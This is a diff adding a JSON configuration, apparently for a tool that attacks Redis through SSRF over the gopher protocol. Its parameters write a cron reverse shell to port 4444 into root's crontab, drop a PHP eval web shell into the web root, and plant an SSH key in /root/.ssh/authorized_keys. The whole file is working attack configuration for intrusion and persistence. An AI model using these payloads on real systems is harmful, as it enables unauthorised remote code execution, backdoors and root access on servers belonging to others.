@@ -1,0 +1,24 @@
+{
+  "redis": {
+    "protocol": "gopher://",
+    "ip": "127.0.0.1",
+    "port": "6379",
+    "password": ""
+  },
+  "cron": {
+    "reverse_ip": "127.0.0.1",
+    "reverse_port": "4444",
+    "filename": "root",
+    "path": "/var/spool/cron"
+  },
+  "webshell": {
+    "shell_content": "<?php eval($_GET[1]);?>",
+    "filename": "123.php",
+    "path": "/var/www/html"
+  },
+  "ssh": {
+    "public_key": "ssh-rsa AAAAB3NzaC1yc2E...",
+    "filename": "authorized_keys",
+    "path": "/root/.ssh/"
+  }
+}
